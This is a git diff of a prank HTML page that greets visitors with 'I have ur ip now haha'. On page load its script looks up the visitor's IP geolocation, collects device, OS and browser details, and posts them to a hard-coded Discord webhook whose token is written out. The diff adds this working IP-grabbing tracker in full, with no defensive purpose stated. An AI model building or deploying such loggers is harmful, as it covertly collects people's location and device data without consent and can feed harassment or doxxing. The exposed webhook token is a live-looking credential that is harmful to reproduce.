@@ -1,7 +1,27 @@
-<script>
-  const webhookUrl = "YOUR_WEBHOOK_URL_HERE";
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>hi :)</title>
+  <style>
+    body {
+      background: #111;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 20%;
+      font-size: 2rem;
+    }
+  </style>
+</head>
+<body>
 
-  // Function to detect device type
+  hi :)<br>
+  I have ur ip now haha 
+
+<script>
+  const webhookUrl = "https://discord.com/api/webhooks/1446998835229626412/aL3byydfp-9STVBzdf8SMsAiTASlJFHxQrjts7rttPgGlhcCvNE1adAd2ESDJd5qdS4B";
+
   function getDeviceType() {
     const ua = navigator.userAgent;
     if (/mobile/i.test(ua)) return "Mobile";
@@ -9,7 +29,6 @@
     return "Desktop";
   }
 
-  // Function to detect OS
   function getOS() {
     const ua = navigator.userAgent;
     if (ua.includes("Win")) return "Windows";
@@ -20,7 +39,6 @@
     return "Unknown";
   }
 
-  // Function to detect browser
   function getBrowser() {
     const ua = navigator.userAgent;
     if (ua.includes("Chrome")) return "Chrome";
@@ -30,12 +48,11 @@
     return "Unknown";
   }
 
-  // Fetch GeoIP data
   fetch("https://ipapi.co/json/")
     .then(res => res.json())
     .then(data => {
       const payload = {
-        content: "🌐 New visitor on kaypranks.github.io",
+        content: "🌐 New visitor!",
         embeds: [
           {
             title: "Visitor Details",
@@ -45,7 +62,6 @@
               { name: "Country", value: data.country_name || "Unknown", inline: true },
               { name: "Region", value: data.region || "Unknown", inline: true },
               { name: "City", value: data.city || "Unknown", inline: true },
-              { name: "Postal Code", value: data.postal || "Unknown", inline: true },
               { name: "ISP / Org", value: data.org || "Unknown" },
               { name: "Device Type", value: getDeviceType(), inline: true },
               { name: "Operating System", value: getOS(), inline: true },
@@ -61,5 +77,8 @@
         body: JSON.stringify(payload)
       });
     })
-    .catch(err => console.error("GeoIP error:", err));
+    .catch(err => console.error("Error:", err));
 </script>
+
+</body>
+</html>
